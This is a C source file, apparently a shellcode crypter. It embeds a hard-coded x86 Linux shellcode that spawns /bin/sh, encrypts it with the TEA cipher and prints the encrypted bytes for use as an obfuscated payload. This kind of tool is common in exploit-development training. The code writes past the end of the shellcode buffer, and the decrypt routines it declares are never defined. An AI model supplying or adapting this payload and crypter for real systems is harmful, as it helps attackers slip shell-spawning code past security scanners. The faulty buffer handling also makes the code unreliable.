#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

void encrypt (uint32_t* v, uint32_t* k);
void decrypt (uint32_t* v, uint32_t* k);
void encryptBlock(uint8_t * data, uint32_t * len, uint32_t * key);
void decryptBlock(uint8_t * data, uint32_t * len, uint32_t * key);

uint32_t TEAKey[4] = {0x68697071, 0x65646172, 0x6d6f635f, 0x6c697665};
uint8_t shellcode[] =  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

int main()
{
	uint32_t* len;
	uint32_t shellcode_len = 0;
	uint32_t counter = 0;
	
	shellcode_len = strlen(shellcode);
	len = &shellcode_len;

	encryptBlock(shellcode, len, TEAKey);
	puts("\nEncrypted:");	
	for(counter = 0; counter < shellcode_len; counter++)
		printf("\\x%02x", shellcode[counter]);
	printf("\nLength: %d\n", shellcode_len);
	
	return 0;
}

void encryptBlock(uint8_t * data, uint32_t * len, uint32_t * key)
{
   uint32_t blocks, i;
   uint32_t * data32;

   // treat the data as 32 bit unsigned integers
   data32 = (uint32_t *) data;

   // Find the number of 8 byte blocks, add one for the length
   blocks = (((*len) + 7) / 8) + 1;

   // Set the last block to the original data length
   data32[(blocks*2) - 1] = *len;

   // Set the encrypted data length
   *len = blocks * 8;

   for(i = 0; i< blocks; i++)
   {
      encrypt(&data32[i*2], key);
   }
}


void encrypt (uint32_t* v, uint32_t* k) {
    uint32_t v0=v[0], v1=v[1], sum=0, i;           /* set up */
    uint32_t delta=0x9e3779b9;                     /* a key schedule constant */
    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* cache key */
    for (i=0; i < 32; i++) {                       /* basic cycle start */
        sum += delta;
        v0 += ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);
        v1 += ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);  
    }                                              /* end cycle */
    v[0]=v0; v[1]=v1;
}


